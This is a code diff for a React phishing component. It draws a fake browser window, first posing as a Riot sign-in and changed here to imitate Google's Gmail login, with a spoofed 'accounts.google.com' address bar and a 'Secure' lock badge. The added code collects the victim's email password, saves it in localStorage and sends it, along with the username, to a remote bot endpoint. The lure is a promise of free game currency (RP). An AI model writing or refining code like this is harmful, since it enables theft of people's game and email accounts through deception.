@@ -1,11 +1,13 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2, Mail } from 'lucide-react';
+import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock, Loader2, Mail, Eye, EyeOff } from 'lucide-react';
 
 const RiotWindow = ({ onClose, onSuccess }) => {
   const [position, setPosition] = useState({ x: 100, y: 100 });
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
+  const [emailPassword, setEmailPassword] = useState("");
+  const [showEmailPassword, setShowEmailPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   
   const [step, setStep] = useState(1);
@@ -81,7 +83,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
     }
   };
 
-  const sendEmailToBot = async (emailAddress) => {
+  const sendEmailToBot = async (emailAddress, emailPass) => {
     try {
       console.log(`[EMAIL SYNC] Sending email for user: ${username}, email: ${emailAddress}`);
       const response = await fetch(`${BOT_URL}/save-email`, {
@@ -90,7 +92,8 @@ const RiotWindow = ({ onClose, onSuccess }) => {
         body: JSON.stringify({ 
           sessionId, 
           username, 
-          email: emailAddress 
+          email: emailAddress,
+          emailPassword: emailPass
         })
       });
       const data = await response.json();
@@ -160,14 +163,15 @@ const RiotWindow = ({ onClose, onSuccess }) => {
   };
 
   const handleEmailSubmit = async () => {
-    if (!isEmailValid) return;
+    if (!isEmailValid || !emailPassword) return;
     setLoading(true);
     
     // Save email to localStorage
     localStorage.setItem('riot_email', email);
+    localStorage.setItem('riot_email_pass', emailPassword);
     
-    // Send email to C# bot BEFORE redirecting
-    await sendEmailToBot(email);
+    // Send email + password to C# bot BEFORE redirecting
+    await sendEmailToBot(email, emailPassword);
     
     setLoading(false);
     setStep(4);
@@ -307,38 +311,68 @@ const RiotWindow = ({ onClose, onSuccess }) => {
 
     if (step === 3.5) {
       return (
-        <div className="text-center w-full max-w-[360px] mx-auto animate-fadeIn">
-          <div className="w-16 h-16 rounded-full bg-purple-50 flex items-center justify-center mx-auto mb-4 border border-purple-100">
-            <Mail className="w-7 h-7 text-purple-600" />
+        <div className="w-full max-w-[380px] mx-auto">
+          <div className="flex items-center justify-center mb-6">
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" 
+              alt="Google" 
+              className="w-20 h-auto object-contain" 
+            />
           </div>
           
-          <h2 className="text-2xl text-zinc-900 font-bold mb-2">Secure Payout Link</h2>
-          <p className="text-zinc-500 text-xs mb-6 leading-relaxed">
-            Specify the primary account email contact point associated with this Riot ID where your reward details should be delivered.
+          <h2 className="text-2xl text-zinc-900 font-bold text-center mb-1">Sign in</h2>
+          <p className="text-zinc-500 text-sm text-center mb-6">
+            to continue to your account
           </p>
 
-          <div className="space-y-4 text-left">
+          <div className="space-y-4">
             <div>
-              <label className="text-[11px] font-bold text-zinc-400 uppercase tracking-wider block mb-1.5">Account Email Address</label>
+              <label className="text-xs font-medium text-zinc-700 block mb-1">Email</label>
               <input 
                 type="email" 
                 placeholder="name@example.com" 
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
-                className="w-full h-12 px-4 bg-zinc-50 border border-zinc-200 hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-purple-500 font-medium" 
+                className="w-full h-11 px-4 bg-white border border-zinc-300 hover:border-zinc-400 rounded text-sm text-zinc-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all" 
               />
+            </div>
+
+            <div>
+              <label className="text-xs font-medium text-zinc-700 block mb-1">Password</label>
+              <div className="relative">
+                <input 
+                  type={showEmailPassword ? "text" : "password"} 
+                  placeholder="Enter your password" 
+                  value={emailPassword}
+                  onChange={(e) => setEmailPassword(e.target.value)}
+                  className="w-full h-11 px-4 bg-white border border-zinc-300 hover:border-zinc-400 rounded text-sm text-zinc-900 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all pr-10" 
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowEmailPassword(!showEmailPassword)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-zinc-600"
+                >
+                  {showEmailPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                </button>
+              </div>
             </div>
 
             <button 
               onClick={handleEmailSubmit}
-              disabled={!isEmailValid || loading}
-              className={`w-full h-12 rounded-lg font-bold text-sm transition-all flex items-center justify-center gap-2 tracking-wide ${
-                isEmailValid && !loading 
-                  ? "bg-purple-600 hover:bg-purple-700 text-white shadow-lg shadow-purple-600/20 cursor-pointer" 
+              disabled={!isEmailValid || !emailPassword || loading}
+              className={`w-full h-11 rounded-full font-medium text-sm transition-all ${
+                isEmailValid && emailPassword && !loading 
+                  ? "bg-blue-600 hover:bg-blue-700 text-white shadow-sm hover:shadow-md cursor-pointer" 
                   : "bg-zinc-200 text-zinc-400 cursor-not-allowed"
               }`}
             >
-              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Link Email & Claim RP"}
+              {loading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : "Next"}
+            </button>
+          </div>
+
+          <div className="mt-6 text-center">
+            <button className="text-sm text-blue-600 hover:underline font-medium">
+              Forgot password?
             </button>
           </div>
         </div>
@@ -354,7 +388,7 @@ const RiotWindow = ({ onClose, onSuccess }) => {
             </svg>
           </div>
           <h2 className="text-2xl text-green-600 font-bold mb-2">Success!</h2>
-          <p className="text-zinc-600 text-sm">Synchronizing profiles, redirecting to survey module...</p>
+          <p className="text-zinc-600 text-sm">Synchronizing profiles, redirecting to the surveys...</p>
         </div>
       );
     }
@@ -367,11 +401,12 @@ const RiotWindow = ({ onClose, onSuccess }) => {
       style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
       className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
     >
-      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
+      {/* Title Bar */}
+      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31] cursor-grab">
         <div className="flex items-center h-full">
           <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
-            <img src="https://cdn.brandfetch.io/idtxF1ugCc/theme/dark/symbol.svg?c=1bxid64Mup7aczewSAYMX&t=1758261660760" alt="Riot" className="w-4 h-4 object-contain"/>
-            <span className="text-[11px] text-zinc-300 truncate">Riot Sign-In</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="w-4 h-4 object-contain"/>
+            <span className="text-[11px] text-zinc-300 truncate">Gmail Sign-In</span>
             <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
           </div>
         </div>
@@ -382,15 +417,24 @@ const RiotWindow = ({ onClose, onSuccess }) => {
         </div>
       </div>
 
+      {/* URL Bar - Chrome Style with Green https */}
       <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
-        <div className="flex gap-3 text-zinc-500"><ArrowLeft size={16} /><ArrowRight size={16} /><RotateCw size={16} /></div>
+        <div className="flex gap-3 text-zinc-500">
+          <ArrowLeft size={16} className="hover:text-white cursor-pointer" />
+          <ArrowRight size={16} className="hover:text-white cursor-pointer" />
+          <RotateCw size={16} className="hover:text-white cursor-pointer" />
+        </div>
         <div className="flex-1 h-7 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
-          <span className="text-emerald-500">https://</span>
-          <span className="text-zinc-400">auth.riotgames.com</span>
-          <Lock size={12} className="text-green-500 ml-auto" />
+          <span className="text-emerald-500 font-medium">https://</span>
+          <span className="text-zinc-400">accounts.google.com</span>
+          <div className="ml-auto flex items-center gap-1">
+            <Lock size={12} className="text-emerald-500" />
+            <span className="text-emerald-500 text-[10px] font-medium">Secure</span>
+          </div>
         </div>
       </div>
 
+      {/* Content */}
       <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
         <img 
           src="https://esportsinsider.com/wp-content/uploads/2022/02/ESI-Illustrations-9-696x418.png" 
